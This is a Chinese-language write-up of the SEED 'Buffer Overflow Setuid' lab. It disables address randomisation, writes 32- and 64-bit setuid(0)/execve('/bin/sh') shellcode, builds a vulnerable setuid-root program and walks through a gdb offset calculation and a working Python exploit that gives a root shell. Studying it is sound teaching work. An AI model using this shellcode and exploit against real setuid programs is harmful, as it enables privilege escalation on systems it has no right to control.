# 缓冲区溢出攻击之 Buffer Overflow Setuid

## 一、实验准备

### 1. 关闭地址随机化

Address Space Randomization. Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; **<font color="red">guessing addresses is one of the critical steps of buffer-overflow attacks</font>**. This feature can be disabled using the following command:

```shell{.line-numbers}
$ sudo sysctl -w kernel.randomize_va_space=0
```

### 2.编写 shellcode

#### 2.1 shellcode 的 c 代码形式

```c{.line-numbers}
#include <stdio.h>

int main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

#### 2.2 32-bit 形式的 shellcode

```armasm{.line-numbers}
;文件名：sh32.s
;调用 setuid(0) 函数
xorl %eax, %eax
xorl %ebx, %ebx
movb $0xd5, %al
int $0x80

;Store the command on stack
xorl %eax, %eax
pushl %eax
pushl $0x68732f2f
pushl $0x6e69622f
;ebx --> "/bin//sh": execve()’s 1st argument
movl %esp, %ebx

;Construct the argument array argv[]
;argv[1] = 0
pushl %eax
;argv[0] --> "/bin//sh" 
pushl %ebx
;%ecx --> argv[]: execve()’s 2nd argument
movl %esp, %ecx

;For environment variable
;%edx = 0: execve()’s 3rd argument
xorl %edx, %edx

;Invoke execve()
xorl %eax, %eax
;execve()’s system call number
movb $0x0b, %al
int $0x80
```

使用 **`gcc -nostdlib -static sh32.s -o sh32`** 命令编译上述汇编代码，然后使用 objdump -d 对编译得到二进制机器码进行反汇编。

```armasm{.line-numbers}
monica@xvm:~/csapp/seed-buffer-overflow-lab$ objdump -d sh32

sh32：     文件格式 elf32-i386

Disassembly of section .text:

08049000 <__bss_start-0x1000>:
 8049000:	31 c0                	xor    %eax,%eax
 8049002:	31 db                	xor    %ebx,%ebx
 8049004:	b0 d5                	mov    $0xd5,%al
 8049006:	cd 80                	int    $0x80
 8049008:	31 c0                	xor    %eax,%eax
 804900a:	50                   	push   %eax
 804900b:	68 2f 2f 73 68       	push   $0x68732f2f
 8049010:	68 2f 62 69 6e       	push   $0x6e69622f
 8049015:	89 e3                	mov    %esp,%ebx
 8049017:	50                   	push   %eax
 8049018:	53                   	push   %ebx
 8049019:	89 e1                	mov    %esp,%ecx
 804901b:	31 d2                	xor    %edx,%edx
 804901d:	31 c0                	xor    %eax,%eax
 804901f:	b0 0b                	mov    $0xb,%al
 8049021:	cd 80                	int    $0x80
```

#### 2.3 64-bit 形式的 shellcode

```armasm{.line-numbers}
;文件名：sh64.s
;调用 setuid(0) 函数
xorq 	%rdi, %rdi
movb	$105, %al
syscall

;%rdx = 0: execve()’s 3rd argument
xorq %rdx, %rdx
pushq %rdx
;the command we want to run
movabs $0x68732f2f6e69622f, %rax
pushq %rax
;%rdi --> "/bin//sh": execve()’s 1st argument
movq %rsp, %rdi

;argv[1] = 0
pushq %rdx
;argv[0] --> "/bin//sh"
pushq %rdi
;rsi --> argv[]: execve()’s 2nd argument
movq %rsp,%rsi

xorq %rax, %rax

;execve()’s system call number
movb $0x3b, %al
syscall
```

使用 **`gcc -nostdlib -static sh64.s -o sh64`** 命令编译上述汇编代码，然后使用 objdump -d 对编译得到二进制机器码进行反汇编。

```armasm{.line-numbers}
monica@xvm:~/csapp/seed-buffer-overflow-lab$ objdump -d sh64

sh64：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000401000 <__bss_start-0x1000>:
  401000:	48 31 ff             	xor    %rdi,%rdi
  401003:	b0 69                	mov    $0x69,%al
  401005:	0f 05                	syscall 
  401007:	48 31 d2             	xor    %rdx,%rdx
  40100a:	52                   	push   %rdx
  40100b:	48 b8 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rax
  401012:	2f 73 68 
  401015:	50                   	push   %rax
  401016:	48 89 e7             	mov    %rsp,%rdi
  401019:	52                   	push   %rdx
  40101a:	57                   	push   %rdi
  40101b:	48 89 e6             	mov    %rsp,%rsi
  40101e:	48 31 c0             	xor    %rax,%rax
  401021:	b0 3b                	mov    $0x3b,%al
  401023:	0f 05                	syscall 
```

#### 2.4 执行 shellcode

我们将上述编译得到的 32 位和 64 位 shellcode 的二进制代码编写到下面的 c 代码中：

```c{.line-numbers}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
#if __x86_64__
"\x48\x31\xff"
"\xb0\x69"
"\x0f\x05"

"\x48\x31\xd2"
"\x52"
"\x48\xb8\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68"
"\x50"
"\x48\x89\xe7"
"\x52"
"\x57"
"\x48\x89\xe6"
"\x48\x31\xc0"
"\xb0\x3b"
"\x0f\x05"
#else
"\x31\xc0"
"\x31\xdb"
"\xb0\xd5"
"\xcd\x80"

"\x31\xc0"
"\x50"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x31\xd2"
"\x31\xc0"
"\xb0\x0b"
"\xcd\x80"
#endif
;
int main(int argc, char **argv) {

    char code[500];
    // Copy the shellcode to the stack// Copy the shellcode to the stack
    strcpy(code, shellcode);
    int (*func)() = (int(*)())code;
    // Invoke the shellcode from the stack
    func();
    return 1;
}
```

The code above includes two copies of shellcode, one is 32-bit and the other is 64-bit. **<font color="red">When we compile the program using the `-m32` flag, the 32-bit version will be used; without this flag, the 64-bit version will be used</font>**. 接下来，使用 **`gcc call_shellcode.c -o call32 -m32 -z execstack -fno-stack-protector`** 命令和 **`gcc call_shellcode.c -o call64 -z execstack -fno-stack-protector`** 将上述代码编译成 32 位和 64 位的二进制程序 call32 和 call64。接下来分别将上述程序设置成 Set-UID 特权程序，最后运行，得到的结果如下所示：

```c{.line-numbers}
monica@xvm:~/csapp/seed-buffer-overflow-lab$ gcc call_shellcode.c -o call32 -m32 -z execstack -fno-stack-protector
monica@xvm:~/csapp/seed-buffer-overflow-lab$ sudo chown root call32
monica@xvm:~/csapp/seed-buffer-overflow-lab$ sudo chmod 4755 call32
monica@xvm:~/csapp/seed-buffer-overflow-lab$ ./call32
# 
monica@xvm:~/csapp/seed-buffer-overflow-lab$ gcc call_shellcode.c -o call64 -z execstack -fno-stack-protector
monica@xvm:~/csapp/seed-buffer-overflow-lab$ sudo chown root call64
monica@xvm:~/csapp/seed-buffer-overflow-lab$ sudo chmod 4755 call64
monica@xvm:~/csapp/seed-buffer-overflow-lab$ ./call64
# 
```

### 3.编写漏洞程序

漏洞程序如下所示，首先从 badfile 文件中获取输入并保存到 str 数组中，接着将此输入通过 strcpy 函数复制到 bof 的函数栈中。

```c{.line-numbers}
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str) {

    char buffer[BUF_SIZE];
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv) {
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

## 二、对 32 位程序进行攻击——Level 1

首先我们使用 **`gcc -m32 -o stack_l1_gdb -z execstack -fno-stack-protector stack.c -g`** 命令编译上述代码，得到二进制程序 stack_l1_gdb，然后使用 gdb 对 stack_l1_gdb 进行调试：

```shell{.line-numbers}
monica@xvm:~/csapp/seed-buffer-overflow-lab$ gcc -m32 -o stack_l1_gdb -z execstack -fno-stack-protector stack.c -g
monica@xvm:~/csapp/seed-buffer-overflow-lab$ sudo chown root stack_l1_gdb 
monica@xvm:~/csapp/seed-buffer-overflow-lab$ sudo chmod 4755 stack_l1_gdb 
monica@xvm:~/csapp/seed-buffer-overflow-lab$ gdb stack_l1_gdb 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from stack_l1_gdb...

(gdb) b bof
Breakpoint 1 at 0x11de: file stack.c, line 14.
(gdb) r
Breakpoint 1, bof (str=0xffffce77 "") at stack.c:14
14      strcpy(buffer, str);
(gdb) p $ebp
$1 = (void *) 0xffffce58
(gdb) p &buffer
$3 = (char (*)[100]) 0xffffcdec
(gdb) p/d 0xffffce58-0xffffcdec
$4 = 108
```

从上述 gdb 调试得到的 %ebp 的值为 **`0xffffce58`**，buffer 的起始地址为 **`0xffffcdec`**。

>**<font color="red">_It should be noted that the frame pointer value obtained from gdb is different from that during the actual execution (without using gdb)_</font>**. This is because gdb has pushed some environment data into the stack before running the debugged program. When the program runs directly without using gdb, the stack does not have those data, **so the actual frame pointer value will be larger**. You should keep this in mind when constructing your payload.

为了验证上面关于 %ebp 寄存器在程序实际运行时的值大于使用 gdb 调试时的值的说法，我们将 bof 函数修改如下，stack.c 代码中的其余部分保持不变，这里使用内联汇编在运行时获取并打印 %ebp 寄存器和 buffer 起始地址的值。

```c{.line-numbers}
int bof(char *str) {
    char buffer[BUF_SIZE];
    unsigned long ebp_value;
    __asm__ volatile ("movl %%ebp, %0" : "=r" (ebp_value));
    printf("buffer:%p  ebp:0x%lx\n", buffer, ebp_value);
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}
```

同样使用 **`gcc -m32 -o stack_l1_gdb -z execstack -fno-stack-protector stack.c -g`** 命令编译并得到二进制程序 stack_l1_gdb，然后运行得到的结果如下所示，**<font color="red">可以看出，运行时 %ebp 的值 **`0xffffcec8`** 大于使用 gdb 调试时获取到的 %ebp 值</font>** **`0xffffce58`**。

```c{.line-numbers}
monica@xvm:~/csapp/seed-buffer-overflow-lab$ ./stack_l1_gdb 
buffer:0xffffce58  ebp:0xffffcec8
Returned Properly
```

从以上的执行结果可以看出，帧指针 %ebp 的实际值是 **`0xffffcec8`**。因此返回地址保存在 **`0xffffcec8+4`** 中，并且第一个 NOP 指令在 **`0xffffcec8+8`**。因此，可以将 **`0xffffcec8+8`** 作为恶意代码的入口地址，把它写入返回地址字段中。

由于输入将被复制到 buffer 中，为了让输入中的返回地址字段准确地覆盖栈中的返回地址区域，**需要知道栈中 buffer 和返回地址区域之间的距离，这个距离就是返回地址字段在输入数据中的相对位置**。

从调试信息可以轻松地获知 buffer 的起始地址，然后计算出从 %ebp 到 buffer 起始处的距离。通过计算，得到的结果是 112，因此返回地址区域到 buffer 起始处的距离就是 116。

因此，我们使用如下的 exploit.py 文件构造 badfile 输入：

```python{.line-numbers}
import sys

shellcode = (
    "\x31\xc0"
    "\x31\xdb"
    "\xb0\xd5"
    "\xcd\x80"

    "\x31\xc0"
    "\x50"
    "\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x31\xd2"
    "\x31\xc0"
    "\xb0\x0b"
    "\xcd\x80"
).encode('latin-1')

content = bytearray(0x90 for i in range(400))
content[400 - len(shellcode):] = shellcode

ret = 0xffffcec8 + 50
content[116:120] = (ret).to_bytes(4, byteorder='little')

file = open("badfile", "wb")
file.write(content)
file.close()
```

运行得到的结果如下所示：

```c{.line-numbers}
monica@xvm:~/csapp/seed-buffer-overflow-lab$ python3 exploit.py 
monica@xvm:~/csapp/seed-buffer-overflow-lab$ ./stack_l1_gdb 
buffer:0xffffce58  ebp:0xffffcec8
# 
```

